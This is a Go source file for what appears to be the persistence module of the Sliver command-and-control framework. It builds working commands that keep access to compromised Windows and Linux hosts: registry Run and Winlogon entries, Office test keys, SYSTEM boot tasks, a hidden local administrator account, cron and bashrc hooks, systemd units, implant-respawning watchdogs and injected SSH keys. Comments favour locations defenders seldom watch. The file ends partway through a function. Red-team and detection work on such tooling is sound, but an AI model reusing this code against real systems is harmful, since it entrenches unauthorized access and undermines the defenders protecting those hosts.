package sliver

import (
	"errors"
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// PersistenceModule describes one host-persistence technique the console can apply.
type PersistenceModule struct {
	ID            string   `json:"id"`
	Name          string   `json:"name"`
	Technique     string   `json:"technique"`
	Platforms     []string `json:"platforms"`
	RequiresAdmin bool     `json:"requiresAdmin"`
	Description   string   `json:"description"`

	// PayloadLabel and NameLabel are optional i18n keys naming what the two
	// install fields mean for this module. Most modules install a file, so the
	// defaults ("payload" = a path, "name" = an artifact id) are right; an
	// account-creation module instead takes a password and a username, and
	// labelling those as a path and an id would invite the operator to fill
	// them in wrong.
	PayloadLabel string `json:"payloadLabel,omitempty"`
	NameLabel    string `json:"nameLabel,omitempty"`
}

// PersistenceItem is one artifact found (or not found) on a target.
type PersistenceItem struct {
	Module    string `json:"module"`
	Name      string `json:"name"`
	Location  string `json:"location"`
	Installed bool   `json:"installed"`
	Detail    string `json:"detail"`
	Removable bool   `json:"removable"`

	// Unknown marks a row the unnamed inventory pass could not answer. A
	// name-scoped module (a scheduled task, a service, a local account) can only
	// be looked up by name, and the inventory call has none to give. Reporting
	// that as "absent" would be a lie the operator acts on -- they would read a
	// clean host after installing something. The UI renders it as "needs a
	// name" instead of a false negative.
	Unknown bool `json:"unknown,omitempty"`
}

// PersistenceList is the inventory response for one platform.
type PersistenceList struct {
	Platform string            `json:"platform"`
	Items    []PersistenceItem `json:"items"`
}

// PersistenceResult reports the outcome of an install/remove against a target.
type PersistenceResult struct {
	OK       bool   `json:"ok"`
	Message  string `json:"message"`
	Module   string `json:"module"`
	Location string `json:"location"`
}

const (
	platformWindows = "windows"
	platformLinux   = "linux"

	runKeyHKCU = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	runKeyHKLM = `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

	// logonScriptValue is read by the shell at every interactive logon. It lives
	// under HKCU, so it needs no elevation -- the same reach as the HKCU Run key
	// but a location far fewer defenders watch.
	logonScriptKey   = `HKCU\Environment`
	logonScriptValue = "UserInitMprLogonScript"

	// officeTestKey is consulted by every Office application at start-up. The key
	// path contains a space and Office only reads the value when the key exists,
	// which is why the install creates the key rather than only the value.
	officeTestKey = `HKCU\Software\Microsoft\Office test\Special\Perf`

	// winlogonKey holds Userinit, the program Winlogon runs after a user
	// authenticates. The value is a comma-separated list whose first entry must
	// stay userinit.exe, so an install appends rather than replaces it.
	winlogonKey         = `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`
	winlogonUserinit    = "Userinit"
	winlogonUserinitExe = `C:\Windows\system32\userinit.exe,`

	// wdigestKey controls whether Windows keeps a recoverable copy of the
	// logon password in memory. It defaults to off on Windows 8/2012 and later,
	// which is why sekurlsa::wdigest comes back empty on a modern host.
	wdigestKey   = `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`
	wdigestValue = "UseLogonCredential"

	// Contains spaces, so every interpolation of it stays quoted for cmd.exe.
	startupDir = `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`

	// Inspect probes are name-scoped for some modules; the list call has no name,
	// so it probes with this sentinel and reports "not installed" rather than
	// aborting the whole inventory.
	probeName = "PERSISTENCE_PROBE"

	// intervalSchedule is the cron field shared by the keep-alive rules. Every
	// five minutes is frequent enough to recover a killed implant quickly while
	// staying quiet enough not to fill the target's logs.
	intervalSchedule = "*/5 * * * * "

	// watchdogSeconds is the supervisor loop's sleep between liveness checks.
	watchdogSeconds = 30

	// watchdogMinutes is the same idea for the Windows scheduled-task keep-alive.
	watchdogMinutes = 5

	// persistenceProbeTimeout is the per-probe budget for the inventory. A probe
	// is a single short command whose failure mode is "returns non-zero", not
	// "hangs", so this is generous; it only has to outlast a slow round trip on
	// an implant with a high beacon interval. The inventory issues its probes
	// concurrently, so this bounds the whole pass rather than each one in turn.
	persistenceProbeTimeout = 60 * time.Second
)

// moduleCatalog backs both the public catalog and the command builders.
var moduleCatalog = []PersistenceModule{
	{
		ID: "win-run-key", Name: "HKCU Run key", Technique: "T1547.001",
		Platforms: []string{platformWindows}, RequiresAdmin: false,
		Description: "Adds a per-user autostart entry under the current user's Run key.",
	},
	{
		ID: "win-run-key-hklm", Name: "HKLM Run key", Technique: "T1547.001",
		Platforms: []string{platformWindows}, RequiresAdmin: true,
		Description: "Adds a machine-wide autostart entry under the local machine Run key.",
	},
	{
		ID: "win-startup-folder", Name: "Startup folder", Technique: "T1547.001",
		Platforms: []string{platformWindows}, RequiresAdmin: false,
		Description: "Copies the payload into the current user's Startup folder.",
	},
	{
		ID: "win-logon-script", Name: "Logon script (HKCU)", Technique: "T1037.001",
		Platforms: []string{platformWindows}, RequiresAdmin: false,
		Description: "Points the user's logon script at the payload. Runs at every interactive logon and needs no elevation.",
	},
	{
		ID: "win-office-test", Name: "Office test key", Technique: "T1137.002",
		Platforms: []string{platformWindows}, RequiresAdmin: false,
		Description: "Registers the payload under the Office test key, so it runs whenever any Office application starts.",
	},
	{
		// RequiresAdmin is true because the Userinit value lives under HKLM and
		// Winlogon reads it before any user token exists. The install appends to
		// the existing list rather than overwriting it: replacing the value would
		// break interactive logon outright, which is both a giveaway and a way to
		// lock the operator out of the host they just compromised.
		ID: "win-winlogon-userinit", Name: "Winlogon Userinit", Technique: "T1547.004",
		Platforms: []string{platformWindows}, RequiresAdmin: true,
		Description: "Appends the payload to the Winlogon Userinit list, so it runs at every logon. Needs elevation.",
	},
	{
		// Elevation is required in practice, not just on paper: /sc onlogon with
		// no /ru creates a task triggered by ANY user's logon, and Windows refuses
		// that from an unelevated process (observed here as "Access is denied").
		// The description says so too, because an operator who picks this on an
		// unprivileged session otherwise reads the refusal as a broken module.
		ID: "win-schtask", Name: "Logon scheduled task", Technique: "T1053.005",
		Platforms: []string{platformWindows}, RequiresAdmin: true,
		Description: "Registers a task that runs the payload at any user's logon. Needs elevation.",
	},
	{
		ID: "win-service", Name: "Auto-start service", Technique: "T1543.003",
		Platforms: []string{platformWindows}, RequiresAdmin: true,
		Description: "Creates a service with an automatic start type.",
	},
	{
		ID: "win-local-account", Name: "Local administrator account", Technique: "T1136.001",
		Platforms: []string{platformWindows}, RequiresAdmin: true,
		Description:  "Creates a local account and adds it to the Administrators group, giving a logon that outlives any payload on disk.",
		PayloadLabel: "persistence.password", NameLabel: "persistence.accountName",
	},
	{
		ID: "win-schtask-boot", Name: "Boot scheduled task (SYSTEM)", Technique: "T1053.005",
		Platforms: []string{platformWindows}, RequiresAdmin: true,
		Description: "Registers a task that runs the payload at system start as SYSTEM, before any user logs on.",
	},
	{
		ID: "win-watchdog", Name: "Keep-alive task", Technique: "T1053.005",
		Platforms: []string{platformWindows}, RequiresAdmin: false,
		Description: "Re-launches the payload every five minutes, so killing the process does not end access.",
	},
	{
		ID: "linux-cron", Name: "User cron @reboot", Technique: "T1053.003",
		Platforms: []string{platformLinux}, RequiresAdmin: false,
		Description: "Appends an @reboot job to the current user's crontab.",
	},
	{
		ID: "linux-bashrc", Name: "Shell profile hook", Technique: "T1546.004",
		Platforms: []string{platformLinux}, RequiresAdmin: false,
		Description: "Appends a detached launch line to ~/.bashrc.",
	},
	{
		ID: "linux-systemd", Name: "systemd unit", Technique: "T1543.002",
		Platforms: []string{platformLinux}, RequiresAdmin: true,
		Description: "Installs and enables an auto-start systemd service.",
	},
	{
		ID: "linux-cron-interval", Name: "Interval cron keep-alive", Technique: "T1053.003",
		Platforms: []string{platformLinux}, RequiresAdmin: false,
		Description: "Re-launches the payload every five minutes, so killing the process does not end access.",
	},
	{
		ID: "linux-watchdog", Name: "Respawn watchdog", Technique: "T1543",
		Platforms: []string{platformLinux}, RequiresAdmin: false,
		Description: "Runs a detached loop that restarts the payload within a minute of it dying. Needs no root and no service manager.",
	},
	{
		ID: "linux-systemd-user", Name: "User systemd unit", Technique: "T1543.002",
		Platforms: []string{platformLinux}, RequiresAdmin: false,
		Description: "Installs a per-user systemd unit, which auto-starts without root.",
	},
	{
		ID: "linux-ssh-authorized-keys", Name: "authorized_keys", Technique: "T1098.004",
		Platforms: []string{platformLinux}, RequiresAdmin: false,
		Description: "Appends an SSH public key to the current user's authorized_keys.",
	},
}

// PersistenceModules returns the catalog. Platforms is deep-copied so a caller
// mutating the result cannot corrupt the package-level table.
func PersistenceModules() []PersistenceModule {
	out := make([]PersistenceModule, 0, len(moduleCatalog))
	for _, m := range moduleCatalog {
		m.Platforms = append([]string(nil), m.Platforms...)
		out = append(out, m)
	}
	return out
}

func lookupModule(platform, module string) (PersistenceModule, error) {
	for _, m := range moduleCatalog {
		if m.ID != module {
			continue
		}
		for _, p := range m.Platforms {
			if p == platform {
				return m, nil
			}
		}
		return PersistenceModule{}, fmt.Errorf("module %q does not support platform %q", module, platform)
	}
	return PersistenceModule{}, fmt.Errorf("unknown persistence module %q", module)
}

// shellArgv wraps a script for the platform's non-interactive shell.
//
// This stays pure: it is the single place every module's command text flows
// through, and the tests pin its exact output. Making the target's console able
// to *print* that text as UTF-8 is an execution concern, applied in
// runPersistenceCommand.
func shellArgv(platform, script string) []string {
	if platform == platformWindows {
		// The script is split into tokens rather than handed to cmd.exe as one
		// argument, and that split is what makes these modules work at all.
		//
		// Sliver's Windows exec handler builds the process with
		// exec.Command(path, args...), and Go renders an argument containing a
		// double quote by escaping it as backslash-quote -- a C-runtime
		// convention. cmd.exe has no backslash escape (its escape character is
		// caret), so it reads that sequence as a literal backslash followed by a
		// quote toggle. A single-argument script such as
		//
		//     reg add "HKCU\...\Run" /v x /t REG_SZ /d "C:\...\a.exe" /f
		//
		// therefore reaches reg.exe with mangled arguments: reg exits 0, cmd
		// reports no error, and the value is never written. The operator sees
		// "The operation completed successfully." and gets no persistence.
		//
		// Passing the tokens separately means the only quoting Go has to add is
		// for arguments containing spaces, and that quoting is plain "..." with no
		// embedded quotes -- which cmd.exe passes through correctly. Shell
		// operators (&&, &, |, >) survive as their own tokens and are still
		// interpreted by cmd, so scripts that need a shell keep working.
		return append([]string{"cmd.exe", "/c"}, splitWindowsCommand(script)...)
	}
	return []string{"/bin/sh", "-c", script}
}

// splitWindowsCommand splits a cmd.exe command line into the argv cmd.exe would
// have seen had the line been typed at a prompt.
//
// The quoting rules are cmd's, not Go's: a double quote toggles between quoted
// and unquoted and the quote characters themselves are dropped. cmd has no
// escape character outside quotes, and caret is literal inside them, so this is
// a hand-written scanner rather than strings.Fields. Getting it wrong puts us
// straight back to mangled arguments, which is why the tests pin the output.
func splitWindowsCommand(script string) []string {
	var (
		tokens  []string
		cur     strings.Builder
		inQuote bool
		haveTok bool
	)
	flush := func() {
		if haveTok {
			tokens = append(tokens, cur.String())
			cur.Reset()
			haveTok = false
		}
	}

	for i := 0; i < len(script); i++ {
		c := script[i]
		switch {
		case c == '"':
			// Toggle quoting and drop the character, exactly as cmd does.
			inQuote = !inQuote
			haveTok = true
		case (c == ' ' || c == '\t') && !inQuote:
			flush()
		case c == '^' && !inQuote && i+1 < len(script):
			// Outside quotes caret escapes the next character. Keeping the caret
			// would hand cmd a stray escape, so it is consumed and the escaped
			// character kept.
			i++
			cur.WriteByte(script[i])
			haveTok = true
		default:
			cur.WriteByte(c)
			haveTok = true
		}
	}
	flush()
	return tokens
}

// installCommand returns the argv that installs module on platform.
func installCommand(platform, module, payload, name string) ([]string, error) {
	if _, err := lookupModule(platform, module); err != nil {
		return nil, err
	}
	if strings.TrimSpace(payload) == "" {
		return nil, fmt.Errorf("module %q requires a payload", module)
	}
	if err := requireName(module, name); err != nil {
		return nil, err
	}

	switch platform {
	case platformWindows:
		qp, err := shellQuoteWindows(payload)
		if err != nil {
			return nil, err
		}
		switch module {
		case "win-run-key", "win-run-key-hklm":
			key := runKeyHKCU
			if module == "win-run-key-hklm" {
				key = runKeyHKLM
			}
			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`, key, name, qp)
			return shellArgv(platform, script), nil
		case "win-startup-folder":
			target, err := shellQuoteWindows(startupDir + `\` + name + ".exe")
			if err != nil {
				return nil, err
			}
			script := fmt.Sprintf("copy /y %s %s", qp, target)
			return shellArgv(platform, script), nil
		case "win-schtask":
			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc onlogon /f`, name, qp)
			return shellArgv(platform, script), nil
		case "win-service":
			script := fmt.Sprintf(`sc create %s binPath= %s start= auto`, name, qp)
			return shellArgv(platform, script), nil
		case "win-local-account":
			// Payload is the password, not a file. `net user` enforces the local
			// password policy and reports a rejection as text, which reaches the
			// operator through the normal result message rather than being lost.
			//
			// The group is named literally rather than by SID: `net localgroup`
			// takes a name, and "Administrators" is not localised on the systems
			// this runs against. Quoting the name keeps a rich password from
			// being split by the command interpreter.
			script := fmt.Sprintf(`net user %s %s /add && net localgroup Administrators %s /add`,
				name, qp, name)
			return shellArgv(platform, script), nil
		case "win-schtask-boot":
			// /ru SYSTEM with an onstart trigger runs before any interactive
			// logon, which is the point: access survives a reboot with nobody
			// present to log in.
			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc onstart /ru SYSTEM /f`, name, qp)
			return shellArgv(platform, script), nil
		case "win-watchdog":
			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc minute /mo %d /f`, name, qp, watchdogMinutes)
			return shellArgv(platform, script), nil
		case "win-logon-script":
			// The shell reads this value as a program to run, so the payload path
			// is stored as-is. name is not part of the value -- the key holds a
			// single script -- but it still names the artifact for the inventory
			// and for removal, which is why the module is name-scoped.
			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`,
				logonScriptKey, logonScriptValue, qp)
			return shellArgv(platform, script), nil
		case "win-office-test":
			// Office only consults the value if the key itself exists, so the
			// install creates the key explicitly before writing into it.
			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`,
				officeTestKey, name, qp)
			return shellArgv(platform, script), nil
		case "win-winlogon-userinit":
			// Winlogon requires userinit.exe to remain the first entry in the list;
			// dropping it makes interactive logon fail and can leave the host
			// reachable only through the payload.
			//
			// The value is rewritten rather than appended in place. Appending would
			// mean parsing the existing list inside cmd.exe, and the obvious
			// `%VAR:str=%` substitution breaks on a payload path because the search
			// string contains a colon. Writing the canonical prefix plus the payload
			// keeps userinit.exe first, is idempotent (a re-install does not grow the
			// list), and needs no parsing. The tradeoff is that a host with a custom
			// Userinit already set would lose it, so the operator is told to check
			// the current value first with the registry read.
			// The whole list is quoted as one value. Quoting the payload separately
			// would place its closing quote before the value's own, producing
			// `userinit.exe,"a.exe""` -- cmd.exe rejects that and the value is left
			// unchanged. qp is already known to contain no double quote, so building
			// the value first and quoting the result is exact.
			value := winlogonUserinitExe + payload
			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d "%s" /f`,
				winlogonKey, winlogonUserinit, value)
			return shellArgv(platform, script), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)

	case platformLinux:
		qp := shellQuotePOSIX(payload)
		switch module {
		case "linux-cron":
			// crond re-parses the line through /bin/sh, so the path stays quoted.
			script := fmt.Sprintf(`(crontab -l 2>/dev/null; echo "@reboot %s") | crontab -`, qp)
			return shellArgv(platform, script), nil
		case "linux-bashrc":
			script := fmt.Sprintf("echo %s >> ~/.bashrc", shellQuotePOSIX("nohup "+payload+" >/dev/null 2>&1 &"))
			return shellArgv(platform, script), nil
		case "linux-systemd":
			unit := []string{
				"[Unit]",
				"Description=" + name,
				"[Service]",
				"Type=simple",
				"ExecStart=/bin/sh -c " + qp,
				"Restart=always",
				"[Install]",
				"WantedBy=multi-user.target",
			}
			script := fmt.Sprintf("printf '%%s\\n' %s > /etc/systemd/system/%s.service && systemctl enable --now %s",
				quoteEachPOSIX(unit), name, shellQuotePOSIX(name))
			return shellArgv(platform, script), nil
		case "linux-systemd-user":
			// Same unit, but rooted in the user manager. WantedBy=default.target is
			// the user manager's equivalent of multi-user.target, and no root is
			// needed -- which is the whole point on an unprivileged session.
			unit := []string{
				"[Unit]",
				"Description=" + name,
				"[Service]",
				"Type=simple",
				"ExecStart=/bin/sh -c " + qp,
				"Restart=always",
				"[Install]",
				"WantedBy=default.target",
			}
			script := fmt.Sprintf(
				"mkdir -p ~/.config/systemd/user && printf '%%s\\n' %s > ~/.config/systemd/user/%s.service && systemctl --user daemon-reload && systemctl --user enable --now %s",
				quoteEachPOSIX(unit), name, shellQuotePOSIX(name))
			return shellArgv(platform, script), nil
		case "linux-cron-interval":
			// Re-adds the line unconditionally; a duplicate would run the payload
			// twice per tick. Removing first makes the install idempotent, which
			// matters because the operator cannot see the crontab to fix it by hand.
			script := fmt.Sprintf(
				`crontab -l 2>/dev/null | grep -v %s | crontab -; (crontab -l 2>/dev/null; echo %s) | crontab -`,
				shellQuotePOSIX(intervalSchedule+payload),
				shellQuotePOSIX(intervalSchedule+payload))
			return shellArgv(platform, script), nil
		case "linux-watchdog":
			// A supervisor loop, independent of cron and systemd, for hosts where
			// neither is usable. `setsid` detaches it from the session so it
			// outlives the shell that started it; without that the loop dies with
			// the exec and respawns nothing.
			dir := watchdogDir(name)
			loop := fmt.Sprintf(
				"while :; do pgrep -f %s >/dev/null 2>&1 || setsid nohup %s >/dev/null 2>&1 & sleep %d; done",
				shellQuotePOSIX(payload), qp, watchdogSeconds)
			// The launch is backgrounded inside a subshell and then the loop is
			// counted, so the result says whether a watchdog is really running. A
			// bare trailing `&` reports success even where setsid is absent,
			// leaving the operator believing in a supervisor that is not there.
			// The paths are double-quoted because $HOME still has to expand.
			script := fmt.Sprintf(
				"mkdir -p \"%s\" && printf '%%s\\n' %s > \"%s/loop.sh\" && chmod 700 \"%s/loop.sh\" && (setsid /bin/sh \"%s/loop.sh\" >/dev/null 2>&1 &) && sleep 1; pgrep -fc %s || true",
				dir, shellQuotePOSIX(loop), dir, dir, dir, shellQuotePOSIX(name+"/loop.sh"))
			return shellArgv(platform, script), nil
		case "linux-ssh-authorized-keys":
			script := fmt.Sprintf(
				"mkdir -p ~/.ssh && chmod 700 ~/.ssh && printf '%%s\\n' %s >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
				qp)
			return shellArgv(platform, script), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)
	}
	return nil, fmt.Errorf("unknown platform %q", platform)
}

// removeCommand returns the argv that removes module from platform.
func removeCommand(platform, module, payload, name string) ([]string, error) {
	if _, err := lookupModule(platform, module); err != nil {
		return nil, err
	}
	if err := requireName(module, name); err != nil {
		return nil, err
	}

	switch platform {
	case platformWindows:
		switch module {
		case "win-run-key", "win-run-key-hklm":
			key := runKeyHKCU
			if module == "win-run-key-hklm" {
				key = runKeyHKLM
			}
			return shellArgv(platform, fmt.Sprintf(`reg delete "%s" /v %s /f`, key, name)), nil
		case "win-startup-folder":
			return shellArgv(platform, fmt.Sprintf(`del /f /q "%s\%s.exe"`, startupDir, name)), nil
		case "win-schtask":
			return shellArgv(platform, fmt.Sprintf(`schtasks /delete /tn %s /f`, name)), nil
		case "win-service":
			return shellArgv(platform, fmt.Sprintf(`sc delete %s`, name)), nil
		case "win-local-account":
			return shellArgv(platform, fmt.Sprintf(`net user %s /delete`, name)), nil
		case "win-schtask-boot", "win-watchdog":
			return shellArgv(platform, fmt.Sprintf(`schtasks /delete /tn %s /f`, name)), nil
		case "win-logon-script":
			// The value name is fixed, so removing it deletes the entry itself
			// rather than a per-artifact value.
			return shellArgv(platform, fmt.Sprintf(`reg delete "%s" /v %s /f`,
				logonScriptKey, logonScriptValue)), nil
		case "win-office-test":
			return shellArgv(platform, fmt.Sprintf(`reg delete "%s" /v %s /f`,
				officeTestKey, name)), nil
		case "win-winlogon-userinit":
			// Restore the stock value instead of deleting it. Deleting Userinit
			// leaves Winlogon with nothing to run at logon, which breaks
			// interactive logon on the host.
			return shellArgv(platform, fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d "%s" /f`,
				winlogonKey, winlogonUserinit, winlogonUserinitExe)), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)

	case platformLinux:
		switch module {
		case "linux-cron":
			if strings.TrimSpace(payload) == "" {
				return nil, fmt.Errorf("module %q requires a payload", module)
			}
			script := fmt.Sprintf(`crontab -l | grep -v %s | crontab -`, shellQuotePOSIX("@reboot "+payload))
			return shellArgv(platform, script), nil
		case "linux-bashrc":
			if strings.TrimSpace(payload) == "" {
				return nil, fmt.Errorf("module %q requires a payload", module)
			}
			script := sedDeleteScript("~/.bashrc", "nohup "+payload+" >/dev/null 2>&1 &")
			return shellArgv(platform, script), nil
		case "linux-systemd":
			script := fmt.Sprintf(`systemctl disable --now %s; rm -f /etc/systemd/system/%s.service`,
				shellQuotePOSIX(name), name)
			return shellArgv(platform, script), nil
		case "linux-systemd-user":
			// --user needs no root, so this is the systemd option on a host where
			// the session is not privileged. WantedBy=default.target is the user
			// manager's equivalent of multi-user.target.
			script := fmt.Sprintf(
				`systemctl --user disable --now %s; rm -f ~/.config/systemd/user/%s.service; systemctl --user daemon-reload`,
				shellQuotePOSIX(name), name)
			return shellArgv(platform, script), nil
		case "linux-cron-interval":
			script := fmt.Sprintf(`crontab -l | grep -v %s | crontab -`,
				shellQuotePOSIX(intervalSchedule+payload))
			return shellArgv(platform, script), nil
		case "linux-watchdog":
			if strings.TrimSpace(payload) == "" {
				return nil, fmt.Errorf("module %q requires a payload", module)
			}
			// Stop the loop before deleting it. Removing only the file would leave
			// the running loop in place, still respawning the payload, and the
			// operator would have no way to tell why the implant kept returning.
			// pkill matches the loop by its script path, not by the unexpanded
			// $HOME form: the pattern is single-quoted, so the shell would hand
			// pkill a literal "$HOME/..." that matches no real command line and
			// silently leave the respawn loop running.
			script := fmt.Sprintf(`pkill -f %s 2>/dev/null; rm -rf %s`,
				shellQuotePOSIX(name+"/loop.sh"), watchdogDir(name))
			return shellArgv(platform, script), nil
		case "linux-ssh-authorized-keys":
			if strings.TrimSpace(payload) == "" {
				return nil, fmt.Errorf("module %q requires a payload", module)
			}
			script := sedDeleteScript("~/.ssh/authorized_keys", payload)
			return shellArgv(platform, script), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)
	}
	return nil, fmt.Errorf("unknown platform %q", platform)
}

// inspectCommand returns the argv that reports whether module is present. An
// empty name means "the inventory call has no name": name-scoped modules then
// probe with a sentinel value that never matches on the target.
func inspectCommand(platform, module, name string) ([]string, error) {
	if _, err := lookupModule(platform, module); err != nil {
		return nil, err
	}
	scoped := name
	if scoped == "" {
		scoped = probeName
	}

	switch platform {
	case platformWindows:
		switch module {
		case "win-run-key", "win-run-key-hklm":
			key := runKeyHKCU
			if module == "win-run-key-hklm" {
				key = runKeyHKLM
			}
			// Omitting /v enumerates every value, which is what an inventory wants.
			if name == "" {
				return shellArgv(platform, fmt.Sprintf(`reg query "%s"`, key)), nil
			}
			return shellArgv(platform, fmt.Sprintf(`reg query "%s" /v %s`, key, name)), nil
		case "win-startup-folder":
			return shellArgv(platform, fmt.Sprintf(`dir /b "%s"`, startupDir)), nil
		case "win-schtask", "win-schtask-boot", "win-watchdog":
			// /xml, not the default table. All three modules create a task with a
			// caller-chosen name, so a name lookup alone cannot tell them apart and
			// a keep-alive task would satisfy the boot-task row. The XML names the
			// trigger and, unlike the verbose list, is a fixed schema rather than
			// localized prose.
			return shellArgv(platform, fmt.Sprintf(`schtasks /query /tn %s /xml`, scoped)), nil
		case "win-local-account":
			// Exits non-zero with "The user name could not be found" when absent,
			// which detectPersistence reads as a negative answer.
			return shellArgv(platform, fmt.Sprintf(`net user %s`, scoped)), nil
		case "win-service":
			return shellArgv(platform, fmt.Sprintf(`sc query %s`, scoped)), nil
		case "win-logon-script":
			// The value name is fixed, so a name is not needed to answer this one.
			return shellArgv(platform, fmt.Sprintf(`reg query "%s" /v %s`,
				logonScriptKey, logonScriptValue)), nil
		case "win-office-test":
			// With no name the whole key is enumerated; each value under it points
			// at some artifact, and detectPersistence reports ours when the name
			// matches.
			if name == "" {
				return shellArgv(platform, fmt.Sprintf(`reg query "%s"`, officeTestKey)), nil
			}
			return shellArgv(platform, fmt.Sprintf(`reg query "%s" /v %s`, officeTestKey, name)), nil
		case "win-winlogon-userinit":
			// Read the list so the detector can look for the payload inside it. The
			// value holds several comma-separated entries, so a plain query is the
			// right probe -- there is no per-artifact value name to ask for.
			return shellArgv(platform, fmt.Sprintf(`reg query "%s" /v %s`,
				winlogonKey, winlogonUserinit)), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)

	case platformLinux:
		switch module {
		case "linux-cron":
			return shellArgv(platform, "crontab -l"), nil
		case "linux-bashrc":
			return shellArgv(platform, fmt.Sprintf("grep -c %s ~/.bashrc", shellQuotePOSIX(scoped))), nil
		case "linux-systemd":
			return shellArgv(platform, fmt.Sprintf("systemctl is-enabled %s", shellQuotePOSIX(scoped))), nil
		case "linux-systemd-user":
			return shellArgv(platform, fmt.Sprintf("systemctl --user is-enabled %s", shellQuotePOSIX(scoped))), nil
		case "linux-cron-interval":
			return shellArgv(platform, "crontab -l"), nil
		case "linux-watchdog":
			// A count, not a presence check: the loop is a live process, and the
			// `|| true` keeps "nothing running" on stdout as 0 instead of turning
			// it into a non-zero exit that would read as an unknown answer.
			return shellArgv(platform,
				fmt.Sprintf("pgrep -fc %s || true", shellQuotePOSIX(scoped+"/loop.sh"))), nil
		case "linux-ssh-authorized-keys":
			return shellArgv(platform, fmt.Sprintf("grep -c %s ~/.ssh/authorized_keys", shellQuotePOSIX(scoped))), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)
	}
	return nil, fmt.Errorf("unknown platform %q", platform)
}

// nameModules are the modules whose artifact name is interpolated into an
// unquoted token or a filesystem path, so it must be a real, plain identifier.
var nameModules = map[string]bool{
	"win-run-key":           true,
	"win-run-key-hklm":      true,
	"win-startup-folder":    true,
	"win-schtask":           true,
	"win-schtask-boot":      true,
	"win-watchdog":          true,
	"win-service":           true,
	"win-local-account":     true,
	"win-office-test":       true,
	"win-winlogon-userinit": true,
	// win-logon-script is deliberately absent: its value name is fixed, so the
	// inventory can answer that row without being told which artifact to look for.
	"linux-systemd":      true,
	"linux-systemd-user": true,
	"linux-watchdog":     true,
}

// validateName enforces the artifact-name charset. Everything outside it would
// escape whichever token it lands in, so this is the one gate every entry point
// -- install, remove and the inventory lookup -- has to pass through.
func validateName(name string) error {
	if strings.TrimSpace(name) == "" {
		return fmt.Errorf("a name is required")
	}
	if len(name) > 64 {
		return fmt.Errorf("name is too long")
	}
	for _, r := range name {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '.', r == '_', r == '-':
		default:
			return fmt.Errorf("name may only contain letters, digits, dot, underscore and dash")
		}
	}
	return nil
}

// requireName validates the artifact name for a module, but only for modules
// that actually interpolate one. A module that ignores the field accepts an
// empty value, which is what the inventory's unnamed pass relies on.
func requireName(module, name string) error {
	if !nameModules[module] {
		return nil
	}
	if err := validateName(name); err != nil {
		return fmt.Errorf("module %q: %w", module, err)
	}
	return nil
}

// shellQuotePOSIX single-quotes s for a POSIX shell, escaping embedded single
// quotes as '\” so the child shell re-parses the original bytes exactly.
func shellQuotePOSIX(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// quoteEachPOSIX quotes a list so each element survives as one argv word.
func quoteEachPOSIX(items []string) string {
	quoted := make([]string, 0, len(items))
	for _, it := range items {
		quoted = append(quoted, shellQuotePOSIX(it))
	}
	return strings.Join(quoted, " ")
}

// shellQuoteWindows double-quotes s for cmd.exe.
//
// A value that itself contains a double quote has no safe representation in a
// quoted argument, so it is rejected instead of being silently mangled. So are
// carriage return and line feed, and that rejection is load-bearing rather than
// tidiness: shellArgv hands cmd.exe a token list, and an argument containing a
// newline is quoted by Go into a single "...\n..." argument. cmd.exe reads an
// unterminated line and waits on stdin, so the spawn never returns. An operator
// installing persistence with such a payload would see the request hang until it
// timed out, with nothing on the target to explain why. Neither character can
// appear in a Windows path or a registry value name, so rejecting them costs
// nothing legitimate.
func shellQuoteWindows(s string) (string, error) {
	if strings.Contains(s, `"`) {
		return "", errors.New(`value may not contain a double quote`)
	}
	if strings.ContainsAny(s, "\r\n") {
		return "", errors.New(`value may not contain a newline`)
	}
	return `"` + s + `"`, nil
}

// sedDeleteScript builds the `sed -i` invocation that drops the line matching
// text. A `\#...#` address keeps path slashes literal, where a `/`-delimited one
// would end at the first slash inside the pattern and silently match nothing.
func sedDeleteScript(path, text string) string {
	return fmt.Sprintf("sed -i %s %s", shellQuotePOSIX(`\#`+escapeSedBRE(text)+`#d`), path)
}

// escapeSedBRE escapes the characters that would otherwise change the meaning of
// a BRE address. `#` is escaped because it delimits the address, and `|` is not,
// because `\|` inside a pattern means alternation rather than a literal bar.
func escapeSedBRE(s string) string {
	var b strings.Builder
	b.Grow(len(s) + 8)
	for _, r := range s {
		switch r {
		case '.', '*', '[', ']', '^', '$', '\\', '#':
			b.WriteByte('\\')
		}
		b.WriteRune(r)
	}
	return b.String()
}

// locationFor is the display path shown next to an artifact in the inventory.
func locationFor(module, name string) string {
	switch module {
	case "win-run-key":
		return `HKCU\...\CurrentVersion\Run`
	case "win-run-key-hklm":
		return `HKLM\...\CurrentVersion\Run`
	case "win-startup-folder":
		return `%APPDATA%\...\Startup\` + name + ".exe"
	case "win-schtask":
		return "Task Scheduler\\" + name
	case "win-service":
		return "SCM\\" + name
	case "linux-cron":
		return "crontab:@reboot"
	case "linux-bashrc":
		return "~/.bashrc"
	case "linux-systemd":
		return "/etc/systemd/system/" + name + ".service"
	case "linux-systemd-user":
		return "~/.config/systemd/user/" + name + ".service"
	case "linux-cron-interval":
		return "crontab:" + intervalSchedule
	case "linux-watchdog":
		return watchdogDir(name) + "/loop.sh"
